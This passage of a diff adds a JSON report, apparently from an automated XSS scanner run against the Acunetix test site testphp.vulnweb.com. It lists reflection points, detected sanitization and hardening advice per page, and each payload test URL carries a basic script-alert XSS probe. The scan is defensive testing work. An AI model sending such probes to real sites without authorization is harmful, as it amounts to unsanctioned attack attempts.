+            "context": "url_param",
+            "surrounding": "&size=160' width='160' height='100'></a>bla bla bl...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&copy;2019\n  Acunetix Ltd \n</div> \n<br> \n<div styl...",
+            "reflection_type": "direct"
+          },
+          {
+            "framework": "angular",
+            "context": "framework_detection",
+            "reflection_type": "framework"
+          }
+        ],
+        "sinks_identified": [],
+        "defense_mechanisms": [],
+        "risk_level": "low",
+        "recommendation": "Implement a Content Security Policy (CSP) to restrict the sources of executable content. A strong CSP can effectively mitigate XSS attacks by preventing the execution of malicious scripts.\n\nAdd the X-XSS-Protection header with a value of '1; mode=block' to enable the browser's built-in XSS protection mechanisms.\n\nInclude the X-Content-Type-Options header with a value of 'nosniff' to prevent browsers from interpreting files as a different MIME type than declared.",
+        "sanitization_detected": {
+          "detected": true,
+          "mechanisms": [
+            "html_encoding",
+            "tag_removal"
+          ]
+        },
+        "dom_analysis": {
+          "vulnerable_patterns": [],
+          "sinks_identified": [],
+          "sources_identified": [
+            {
+              "source": "url_based",
+              "code": "Height!=document.MM_pgH) location.reload();\n}\nMM_reloadPag"
+            }
+          ],
+          "risk_level": "low"
+        }
+      },
+      "payload_analysis": {
+        "url": "http://testphp.vulnweb.com/listproducts.php?cat=1&xss=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
+        "timestamp": "2025-04-16T19:57:48.036633",
+        "vulnerabilities": [],
+        "reflection_points": [
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "html_body",
+            "surrounding": "<body> \n<div id=\"mainLayer\" style=\"position:absolu...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"-//W3C//DTD HTML 4.01 Transitional//EN\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"position:absolute; width:700px; z-index:1\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"100%\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'product.php?pic=1'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'showimage.php?file=./pictures/1.jpg'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'showimage.php?file=./pictures/1.jpg&size=160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'100'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'artists.php?artist=1'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'showimage.php?file=./pictures/2.jpg&size=160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'100'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'artists.php?artist=1'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'showimage.php?file=./pictures/3.jpg&size=160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'100'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'artists.php?artist=1'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'showimage.php?file=./pictures/4.jpg&size=160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'100'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'artists.php?artist=1'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'showimage.php?file=./pictures/5.jpg&size=160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'100'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'artists.php?artist=1'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'showimage.php?file=./pictures/7.jpg&size=160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'100'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"10\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"107\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"http://www.macromedia.com/shockwave/download/inde...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"107\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"background-color:lightgray;width:100%;text-align:...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&&(parseInt(appVersion)==4)) {\n    document.MM_pgW...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&size=160' width='160' height='100'></a>Lorem ipsu...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&size=160' width='160' height='100'></a>Donec mole...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&size=160' width='160' height='100'></a>Lorem ipsu...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&size=160' width='160' height='100'></a>Lorem ipsu...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&size=160' width='160' height='100'></a>Lorem ipsu...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&size=160' width='160' height='100'></a>bla bla bl...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "cat",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&copy;2019\n  Acunetix Ltd \n</div> \n<br> \n<div styl...",
+            "reflection_type": "direct"
+          },
+          {
+            "framework": "angular",
+            "context": "framework_detection",
+            "reflection_type": "framework"
+          }
+        ],
+        "sinks_identified": [],
+        "defense_mechanisms": [],
+        "risk_level": "low",
+        "recommendation": "Implement a Content Security Policy (CSP) to restrict the sources of executable content. A strong CSP can effectively mitigate XSS attacks by preventing the execution of malicious scripts.\n\nAdd the X-XSS-Protection header with a value of '1; mode=block' to enable the browser's built-in XSS protection mechanisms.\n\nInclude the X-Content-Type-Options header with a value of 'nosniff' to prevent browsers from interpreting files as a different MIME type than declared.",
+        "sanitization_detected": {
+          "detected": true,
+          "mechanisms": [
+            "html_encoding",
+            "tag_removal"
+          ]
+        },
+        "dom_analysis": {
+          "vulnerable_patterns": [],
+          "sinks_identified": [],
+          "sources_identified": [
+            {
+              "source": "url_based",
+              "code": "Height!=document.MM_pgH) location.reload();\n}\nMM_reloadPag"
+            }
+          ],
+          "risk_level": "low"
+        }
+      }
+    },
+    "/product.php?pic=1": {
+      "base_analysis": {
+        "url": "http://testphp.vulnweb.com/product.php?pic=1",
+        "timestamp": "2025-04-16T19:57:48.419147",
+        "vulnerabilities": [],
+        "reflection_points": [
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "html_body",
+            "surrounding": "<body> \n<div id=\"mainLayer\" style=\"position:absolu...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "script_content",
+            "surrounding": "<script language=\"javascript1.2\">\n<!--\n\tfunction p...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"-//W3C//DTD HTML 4.01 Transitional//EN\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"javascript1.2\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"position:absolute; width:700px; z-index:1\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"100%\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'showimage.php?file=./pictures/1.jpg'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'showimage.php?file=./pictures/1.jpg&size=160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'100'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'artists.php?artist=1'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'1'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"10\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"107\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"http://www.macromedia.com/shockwave/download/inde...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"107\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"background-color:lightgray;width:100%;text-align:...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&&(parseInt(appVersion)==4)) {\n    document.MM_pgW...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&size=160' width='160' height='100'></a><h3>Short ...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&copy;2019\n  Acunetix Ltd \n</div> \n<br> \n<div styl...",
+            "reflection_type": "direct"
+          },
+          {
+            "framework": "angular",
+            "context": "framework_detection",
+            "reflection_type": "framework"
+          }
+        ],
+        "sinks_identified": [],
+        "defense_mechanisms": [],
+        "risk_level": "low",
+        "recommendation": "Implement a Content Security Policy (CSP) to restrict the sources of executable content. A strong CSP can effectively mitigate XSS attacks by preventing the execution of malicious scripts.\n\nAdd the X-XSS-Protection header with a value of '1; mode=block' to enable the browser's built-in XSS protection mechanisms.\n\nInclude the X-Content-Type-Options header with a value of 'nosniff' to prevent browsers from interpreting files as a different MIME type than declared.",
+        "sanitization_detected": {
+          "detected": true,
+          "mechanisms": [
+            "html_encoding",
+            "tag_removal"
+          ]
+        },
+        "dom_analysis": {
+          "vulnerable_patterns": [],
+          "sinks_identified": [],
+          "sources_identified": [
+            {
+              "source": "url_based",
+              "code": "--\n\tfunction popUpWindow(URLStr, left, top, width, he"
+            },
+            {
+              "source": "url_based",
+              "code": "eight)\n\t{\n\t  window.open(URLStr, 'popUpWin', 'toolbar"
+            },
+            {
+              "source": "url_based",
+              "code": " 'popUpWin', 'toolbar=no,location=no,directories=no,status"
+            },
+            {
+              "source": "url_based",
+              "code": "Height!=document.MM_pgH) location.reload();\n}\nMM_reloadPag"
+            }
+          ],
+          "risk_level": "low"
+        }
+      },
+      "payload_analysis": {
+        "url": "http://testphp.vulnweb.com/product.php?pic=1&xss=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
+        "timestamp": "2025-04-16T19:57:48.788368",
+        "vulnerabilities": [],
+        "reflection_points": [
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "html_body",
+            "surrounding": "<body> \n<div id=\"mainLayer\" style=\"position:absolu...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "script_content",
+            "surrounding": "<script language=\"javascript1.2\">\n<!--\n\tfunction p...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"-//W3C//DTD HTML 4.01 Transitional//EN\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"javascript1.2\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"position:absolute; width:700px; z-index:1\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"100%\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'showimage.php?file=./pictures/1.jpg'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'showimage.php?file=./pictures/1.jpg&size=160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'160'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'100'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'artists.php?artist=1'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "'1'",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"10\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"107\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"http://www.macromedia.com/shockwave/download/inde...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"107\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"background-color:lightgray;width:100%;text-align:...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&&(parseInt(appVersion)==4)) {\n    document.MM_pgW...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&size=160' width='160' height='100'></a><h3>Short ...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "pic",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&copy;2019\n  Acunetix Ltd \n</div> \n<br> \n<div styl...",
+            "reflection_type": "direct"
+          },
+          {
+            "framework": "angular",
+            "context": "framework_detection",
+            "reflection_type": "framework"
+          }
+        ],
+        "sinks_identified": [],
+        "defense_mechanisms": [],
+        "risk_level": "low",
+        "recommendation": "Implement a Content Security Policy (CSP) to restrict the sources of executable content. A strong CSP can effectively mitigate XSS attacks by preventing the execution of malicious scripts.\n\nAdd the X-XSS-Protection header with a value of '1; mode=block' to enable the browser's built-in XSS protection mechanisms.\n\nInclude the X-Content-Type-Options header with a value of 'nosniff' to prevent browsers from interpreting files as a different MIME type than declared.",
+        "sanitization_detected": {
+          "detected": true,
+          "mechanisms": [
+            "html_encoding",
+            "tag_removal"
+          ]
+        },
+        "dom_analysis": {
+          "vulnerable_patterns": [],
+          "sinks_identified": [],
+          "sources_identified": [
+            {
+              "source": "url_based",
+              "code": "--\n\tfunction popUpWindow(URLStr, left, top, width, he"
+            },
+            {
+              "source": "url_based",
+              "code": "eight)\n\t{\n\t  window.open(URLStr, 'popUpWin', 'toolbar"
+            },
+            {
+              "source": "url_based",
+              "code": " 'popUpWin', 'toolbar=no,location=no,directories=no,status"
+            },
+            {
+              "source": "url_based",
+              "code": "Height!=document.MM_pgH) location.reload();\n}\nMM_reloadPag"
+            }
+          ],
+          "risk_level": "low"
+        }
+      }
+    },
+    "/comment.php?pid=1": {
+      "base_analysis": {
+        "url": "http://testphp.vulnweb.com/comment.php?pid=1",
+        "timestamp": "2025-04-16T19:57:49.184830",
+        "vulnerabilities": [],
+        "reflection_points": [],
+        "sinks_identified": [],
+        "defense_mechanisms": [],
+        "risk_level": "low",
+        "recommendation": "Implement a Content Security Policy (CSP) to restrict the sources of executable content. A strong CSP can effectively mitigate XSS attacks by preventing the execution of malicious scripts.\n\nAdd the X-XSS-Protection header with a value of '1; mode=block' to enable the browser's built-in XSS protection mechanisms.\n\nInclude the X-Content-Type-Options header with a value of 'nosniff' to prevent browsers from interpreting files as a different MIME type than declared.",
+        "sanitization_detected": {
+          "detected": false,
+          "mechanisms": []
+        },
+        "dom_analysis": {
+          "vulnerable_patterns": [],
+          "sinks_identified": [],
+          "sources_identified": [],
+          "risk_level": "low"
+        }
+      },
+      "payload_analysis": {
+        "url": "http://testphp.vulnweb.com/comment.php?pid=1&xss=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
+        "timestamp": "2025-04-16T19:57:49.526050",
+        "vulnerabilities": [],
+        "reflection_points": [],
+        "sinks_identified": [],
+        "defense_mechanisms": [],
+        "risk_level": "low",
+        "recommendation": "Implement a Content Security Policy (CSP) to restrict the sources of executable content. A strong CSP can effectively mitigate XSS attacks by preventing the execution of malicious scripts.\n\nAdd the X-XSS-Protection header with a value of '1; mode=block' to enable the browser's built-in XSS protection mechanisms.\n\nInclude the X-Content-Type-Options header with a value of 'nosniff' to prevent browsers from interpreting files as a different MIME type than declared.",
+        "sanitization_detected": {
+          "detected": false,
+          "mechanisms": []
+        },
+        "dom_analysis": {
+          "vulnerable_patterns": [],
+          "sinks_identified": [],
+          "sources_identified": [],
+          "risk_level": "low"
+        }
+      }
+    },
+    "/guestbook.php": {
+      "base_analysis": {
+        "url": "http://testphp.vulnweb.com/guestbook.php",
+        "timestamp": "2025-04-16T19:57:49.877438",
+        "vulnerabilities": [],
+        "reflection_points": [
+          {
+            "framework": "angular",
+            "context": "framework_detection",
+            "reflection_type": "framework"
+          }
+        ],
+        "sinks_identified": [],
+        "defense_mechanisms": [],
+        "risk_level": "low",
+        "recommendation": "Implement a Content Security Policy (CSP) to restrict the sources of executable content. A strong CSP can effectively mitigate XSS attacks by preventing the execution of malicious scripts.\n\nAdd the X-XSS-Protection header with a value of '1; mode=block' to enable the browser's built-in XSS protection mechanisms.\n\nInclude the X-Content-Type-Options header with a value of 'nosniff' to prevent browsers from interpreting files as a different MIME type than declared.",
+        "sanitization_detected": {
+          "detected": true,
+          "mechanisms": [
+            "html_encoding",
+            "tag_removal"
+          ]
+        },
+        "dom_analysis": {
+          "vulnerable_patterns": [],
+          "sinks_identified": [],
+          "sources_identified": [
+            {
+              "source": "url_based",
+              "code": "Height!=document.MM_pgH) location.reload();\n}\nMM_reloadPag"
+            }
+          ],
+          "risk_level": "low"
+        }
+      },
+      "payload_analysis": {
+        "url": "http://testphp.vulnweb.com/guestbook.php?xss=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
+        "timestamp": "2025-04-16T19:57:50.223874",
+        "vulnerabilities": [],
+        "reflection_points": [
+          {
+            "framework": "angular",
+            "context": "framework_detection",
+            "reflection_type": "framework"
+          }
+        ],
+        "sinks_identified": [],
+        "defense_mechanisms": [],
+        "risk_level": "low",
+        "recommendation": "Implement a Content Security Policy (CSP) to restrict the sources of executable content. A strong CSP can effectively mitigate XSS attacks by preventing the execution of malicious scripts.\n\nAdd the X-XSS-Protection header with a value of '1; mode=block' to enable the browser's built-in XSS protection mechanisms.\n\nInclude the X-Content-Type-Options header with a value of 'nosniff' to prevent browsers from interpreting files as a different MIME type than declared.",
+        "sanitization_detected": {
+          "detected": true,
+          "mechanisms": [
+            "html_encoding",
+            "tag_removal"
+          ]
+        },
+        "dom_analysis": {
+          "vulnerable_patterns": [],
+          "sinks_identified": [],
+          "sources_identified": [
+            {
+              "source": "url_based",
+              "code": "Height!=document.MM_pgH) location.reload();\n}\nMM_reloadPag"
+            }
+          ],
+          "risk_level": "low"
+        }
+      }
+    },
+    "/userinfo.php?uid=1": {
+      "base_analysis": {
+        "url": "http://testphp.vulnweb.com/userinfo.php?uid=1",
+        "timestamp": "2025-04-16T19:57:50.749935",
+        "vulnerabilities": [],
+        "reflection_points": [
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "html_body",
+            "surrounding": "<body> \n<div id=\"mainLayer\" style=\"position:absolu...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"-//W3C//DTD HTML 4.01 Transitional//EN\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"position:absolute; width:700px; z-index:1\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"100%\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"1\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"width:120px;\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"width:120px;\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"10\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"107\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"http://www.macromedia.com/shockwave/download/inde...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"107\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"background-color:lightgray;width:100%;text-align:...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&&(parseInt(appVersion)==4)) {\n    document.MM_pgW...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&copy;2019\n  Acunetix Ltd \n</div> \n<br> \n<div styl...",
+            "reflection_type": "direct"
+          },
+          {
+            "framework": "angular",
+            "context": "framework_detection",
+            "reflection_type": "framework"
+          }
+        ],
+        "sinks_identified": [],
+        "defense_mechanisms": [],
+        "risk_level": "low",
+        "recommendation": "Implement a Content Security Policy (CSP) to restrict the sources of executable content. A strong CSP can effectively mitigate XSS attacks by preventing the execution of malicious scripts.\n\nAdd the X-XSS-Protection header with a value of '1; mode=block' to enable the browser's built-in XSS protection mechanisms.\n\nInclude the X-Content-Type-Options header with a value of 'nosniff' to prevent browsers from interpreting files as a different MIME type than declared.",
+        "sanitization_detected": {
+          "detected": true,
+          "mechanisms": [
+            "html_encoding",
+            "tag_removal"
+          ]
+        },
+        "dom_analysis": {
+          "vulnerable_patterns": [],
+          "sinks_identified": [],
+          "sources_identified": [
+            {
+              "source": "url_based",
+              "code": "Height!=document.MM_pgH) location.reload();\n}\nMM_reloadPag"
+            }
+          ],
+          "risk_level": "low"
+        }
+      },
+      "payload_analysis": {
+        "url": "http://testphp.vulnweb.com/userinfo.php?uid=1&xss=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
+        "timestamp": "2025-04-16T19:57:51.283299",
+        "vulnerabilities": [],
+        "reflection_points": [
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "html_body",
+            "surrounding": "<body> \n<div id=\"mainLayer\" style=\"position:absolu...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"-//W3C//DTD HTML 4.01 Transitional//EN\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"position:absolute; width:700px; z-index:1\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"100%\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"1\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"width:120px;\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"width:120px;\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"10\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"107\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"http://www.macromedia.com/shockwave/download/inde...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"107\"",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "javascript_string",
+            "surrounding": "\"background-color:lightgray;width:100%;text-align:...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
+            "value": "1",
+            "context": "url_param",
+            "surrounding": "&&(parseInt(appVersion)==4)) {\n    document.MM_pgW...",
+            "reflection_type": "direct"
+          },
+          {
+            "parameter": "uid",
